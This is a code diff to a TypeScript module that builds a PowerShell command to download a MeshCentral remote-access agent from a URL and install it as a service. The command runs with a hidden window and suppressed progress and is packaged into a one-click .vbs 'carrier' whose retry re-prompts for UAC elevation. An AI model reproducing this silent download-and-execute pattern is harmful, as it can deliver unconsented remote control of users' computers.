@@ -103,6 +103,15 @@ export function meshAgentDownloadUrl(
  * the user can actually see) → run `-install` (registers the MeshCentral
  * service) → cleanup. Mirrors the silencing posture of trmm.ts
  * toPowerShellInstallCommand (no progress bar, hidden window, no reboot prompt).
+ *
+ * TASK_232b carrier contract (incident 2026-10-19): this command is flattened
+ * by SW's normalizePowerShellCommand (lib/vantra-carrier.ts) before it is
+ * bound into the one-click .vbs — that normalizer FORBIDS any double-quoted
+ * literal containing $/backtick (interpolating_double_quote) and any line
+ * starting with a closing brace (line_structure). The retry is therefore a
+ * SINGLE-LINE for/try/catch in single quotes: fully valid PowerShell, and the
+ * proven TASK_179 VBS renderer (whose own retry re-arms UAC at the VBS layer)
+ * joins lines with `; ` anyway.
  */
 export function buildMeshAgentInstallCommand(
   downloadUrl: string,
@@ -114,17 +123,10 @@ export function buildMeshAgentInstallCommand(
     `$ProgressPreference = 'SilentlyContinue'`,
     `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`,
     `$exe = Join-Path $env:TEMP '${exeName}'`,
-    `for ($i = 1; $i -le ${attempts}; $i++) {`,
-    `  try {`,
-    `    Invoke-WebRequest -Uri "${downloadUrl}" -OutFile $exe -UseBasicParsing`,
-    `    break`,
-    `  } catch {`,
-    `    if ($i -ge ${attempts}) {`,
-    `      throw "Mesh agent download failed after ${attempts} attempts: $($_.Exception.Message)"`,
-    `    }`,
-    `    Start-Sleep -Seconds 2`,
-    `  }`,
-    `}`,
+    // TASK_232b: ONE line, double-quote-free, no line-leading closing brace -
+    // the SW carrier normalizer contract (lib/vantra-carrier.ts). The URI is
+    // single-quoted: the raw meshid may contain `$`/`@`, literal there.
+    `for ($i = 1; $i -le ${attempts}; $i++) { try { Invoke-WebRequest -Uri '${downloadUrl}' -OutFile $exe -UseBasicParsing; break } catch { if ($i -ge ${attempts}) { throw ('Mesh agent download failed after ${attempts} attempts: ' + $_.Exception.Message) }; Start-Sleep -Seconds 2 } }`,
     `Start-Process -FilePath $exe -ArgumentList '-install' -WindowStyle Hidden -Wait`,
     `Remove-Item $exe -Force -ErrorAction SilentlyContinue`,
     `'MeshCentral agent installed.'`,
